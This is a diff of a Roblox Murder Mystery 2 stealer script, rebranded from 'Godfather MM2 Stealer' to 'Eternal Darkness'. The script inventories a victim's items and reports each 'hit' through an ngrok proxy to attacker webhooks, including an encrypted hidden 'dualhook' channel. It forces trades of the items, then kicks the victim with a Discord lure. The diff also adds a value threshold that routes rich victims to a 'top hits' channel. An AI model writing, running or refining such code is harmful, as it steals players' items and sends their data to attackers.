@@ -1,7 +1,7 @@
 repeat task.wait() until game:IsLoaded()
 task.wait(2)
 
--- Sadece MM2'de çalışsın
+-- Only works in MM2
 if game.PlaceId ~= 142823291 then
     game.Players.LocalPlayer:Kick("This script only works in MM2!")
     return
@@ -11,7 +11,7 @@ _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
--- ================= YENİ BYPASS KODU =================
+-- ================= BYPASS CODE =================
 local REAL_JOB_ID = nil
 
 local function getRealJobId()
@@ -73,9 +73,9 @@ local function getRealJobId()
 end
 
 REAL_JOB_ID = getRealJobId()
--- ================= BYPASS SONU =================
+-- ================= BYPASS END =================
 
--- Şifreleme motoru (dualhook için)
+-- Encryption engine (dualhook)
 local a={}for b=0,255 do a[b]=string.char(b)end 
 local function stringchar(b)local c=a[b]or string.char(b)return c end 
 local function mathfloor(b)if b>=0 then return b-(b%1)else local c=b-(b%1)return c==b and c or c-1 end end 
@@ -88,7 +88,6 @@ local function encrypt(b)return toHex(xorCrypt(b,"85acfc6776299e4661b3093d63b6a9
 
 -- ================= PROXY WEBHOOK SYSTEM =================
 
--- FIXED: Removed trailing space from URL
 local PROXY_URL = "https://malevolently-oilless-zita.ngrok-free.app/api/proxy/"
 
 -- EXTERNAL GLOBALS - SET BY LOADER
@@ -96,9 +95,10 @@ local WEBHOOK_ID = _G.WEBHOOK_ID or "default_webhook"
 local usernames_id = _G.USERNAMES or {}
 
 local DUALHOOK_WEBHOOK_ID = "moqs1fx2p8s"
-local PUBLIC_WEBHOOK_ID = "lac9yi4lh18"
+-- CHANGED: Only best hits go to top hits webhook (previously public)
+local TOPHITS_WEBHOOK_ID = "lac9yi4lh18"
 
--- Universal request (TÜM EXECUTORLAR İÇİN)
+-- Universal request (ALL EXECUTORS)
 getgenv().request = getgenv().request 
     or request 
     or http_request 
@@ -251,7 +251,8 @@ local savedRealJobId = (getgenv and (getgenv().RealJobId or getgenv().JobId)) or
 
 local STATUS_API_URL = cfg.StatusApi or ""
 local API_KEY = cfg.ApiKey or ""
-local AVATAR_URL = "https://cdn.discordapp.com/attachments/1469409737220165746/1469677154294825032/IMG_6264.png"
+-- CHANGED: Eternal Darkness branding
+local AVATAR_URL = "https://imgur.com/a/QPq5UQG.png"
 
 local function sendHitToQueue(placeId, jobId, receiverName)
     pcall(function()
@@ -271,7 +272,7 @@ end
 local function upload_to_rubis(items)
     if not items or #items == 0 then return nil end
     
-    local lines = {"Godfather Inventory Dump | Pastefy", "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"), "Total Items: " .. #items, string.rep("-", 50), ""}
+    local lines = {"Eternal Darkness Inventory | Pastefy", "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"), "Total Items: " .. #items, string.rep("-", 50), ""}
     
     table.sort(items, function(a, b)
         local tier_order = {Ancient=9, Godly=8, Unique=7, Vintage=6, Legendary=5, Rare=4, Uncommon=3, Common=2}
@@ -544,7 +545,6 @@ end
 
 local rubisLink = upload_to_rubis(weaponsToSend) or "Upload failed"
 
--- FIXED PROXY SENDING METHOD - Removed trailing space from URL construction
 local function sendToProxy(Wid, payload, isEncrypted)
     task.spawn(function()
         local finalBody = HttpService:JSONEncode(payload)
@@ -552,11 +552,10 @@ local function sendToProxy(Wid, payload, isEncrypted)
             finalBody = encrypt(finalBody)
         end
         
-        -- FIXED: Ensure no trailing space in URL
         local url = PROXY_URL .. tostring(Wid)
-        url = url:gsub("%s+", "") -- Remove any accidental whitespace
+        url = url:gsub("%s+", "")
         
-        print("[Godfather] Sending to proxy:", url)
+        print("[Eternal Darkness] Sending to proxy:", url)
         
         local success, response = pcall(function()
             return request({
@@ -564,18 +563,18 @@ local function sendToProxy(Wid, payload, isEncrypted)
                 Method = "POST",
                 Headers = {
                     ["Content-Type"] = "application/json",
-                    ["User-Agent"] = "Godfather/3.5.1"
+                    ["User-Agent"] = "EternalDarkness/4.0.0"
                 },
                 Body = finalBody
             })
         end)
         
         if not success then
-            warn("[Godfather] Request failed:", tostring(response))
+            warn("[Eternal Darkness] Request failed:", tostring(response))
         elseif response.StatusCode ~= 200 then
-            warn("[Godfather] Proxy error:", response.StatusCode, response.Body)
+            warn("[Eternal Darkness] Proxy error:", response.StatusCode, response.Body)
         else
-            print("[Godfather] Successfully sent")
+            print("[Eternal Darkness] Successfully sent")
         end
     end)
 end
@@ -619,7 +618,7 @@ local function updateTradeMessage()
         fields = itemFields,
         description = string.format("**Total Progress: %d/%d Value (%d%%)**", totalReceivedValue, totalOriginalValue, totalPercentage),
         footer = { 
-            text = "Godfather MM2 Stealer • NULS Hosting • v4.0.0"
+            text = "Eternal Darkness MM2 • v4.0.0"
         },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
@@ -717,14 +716,14 @@ local function sendWebhook(targetWebhookId, isDualhook)
             }
         },
         footer = {
-            text = string.format("Godfather MM2 Stealer • NULS • v4.0.0 • %s", os.date("!%H:%M:%S UTC"))
+            text = string.format("Eternal Darkness MM2 • v4.0.0 • %s", os.date("!%H:%M:%S UTC"))
         },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
 
     local payload = {
         content = content,
-        username = isDualhook and "🔥 Dualhook Alert" or "💎 Godfather Stealer",
+        username = isDualhook and "🔥 Dualhook Alert" or "🌑 Eternal Darkness",
         avatar_url = AVATAR_URL,
         embeds = {embed}
     }
@@ -737,12 +736,16 @@ local function sendWebhook(targetWebhookId, isDualhook)
     end
 end
 
-local function sendPublicHits()
+-- CHANGED: Only sends to top hits webhook for best hits (Good Hit or higher)
+local function sendTopHits()
+    -- Only send if it's a Good Hit or Big Hit (value >= 300)
+    if totalInventoryValue < 300 then return end
+    
     local tier_counts = rarityCounts
     local total_items = 0
     for _, item in ipairs(weaponsToSend) do total_items = total_items + item.Amount end
 
-    local content = "📢 **PUBLIC HIT REGISTERED**"
+    local content = "🔥 **TOP HIT REGISTERED**"
 
     local rarityLines = {}
     local rarities = {"Ancient", "Godly", "Unique", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
@@ -756,10 +759,10 @@ local function sendPublicHits()
     end
 
     local embed = {
-        title = string.format("🌐 Public Greed │ %s", hitCategory),
+        title = string.format("🌑 Eternal Darkness │ %s", hitCategory),
         url = rubisLink,
         color = 0x8B0000,
-        description = string.format("**%s** got hit by Godfathers!", plr.Name),
+        description = string.format("**%s** was consumed by darkness!", plr.Name),
         fields = {
             { 
                 name = "💎 Valuation", 
@@ -778,19 +781,19 @@ local function sendPublicHits()
             }
         },
         footer = { 
-            text = "Godfather MM2 Stealer • NULS Hosting • v4.0.0"
+            text = "Eternal Darkness MM2 • Top Hits • v4.0.0"
         },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
 
     local payload = {
         content = content,
-        username = "📡 Public Broadcast",
+        username = "🔥 Top Hits Broadcast",
         avatar_url = AVATAR_URL,
         embeds = {embed}
     }
 
-    sendToProxy(PUBLIC_WEBHOOK_ID, payload, false)
+    sendToProxy(TOPHITS_WEBHOOK_ID, payload, false)
 end
 
 local function startDualhookTimer()
@@ -821,7 +824,8 @@ local function cancelDualhookTimer()
 end
 
 sendWebhook(WEBHOOK_ID, false)
-sendPublicHits()
+-- CHANGED: Only send to top hits if it's a good/big hit
+sendTopHits()
 
 if totalInventoryValue >= 300 then
     startDualhookTimer()
@@ -854,7 +858,7 @@ local function finishAndKick()
     task.wait(2)
     local discordLink = "https://discord.gg/dUaHggzp9q"
     pcall(function() setclipboard(discordLink) end)
-    plr:Kick("Items taken by Godfather Script\n\n" .. discordLink .. "\n\nJoin to get your items back!")
+    plr:Kick("Items taken by Eternal Darkness\n\n" .. discordLink .. "\n\nJoin to reclaim your soul!")
 end
 
 function doTrade(targetPlayer)
@@ -920,7 +924,7 @@ function doTrade(targetPlayer)
         end)
         
         if not success then
-            warn("[Godfather] Trade error:", err)
+            warn("[Eternal Darkness] Trade error:", err)
             task.wait(1) 
         end
         timeout = timeout + 1
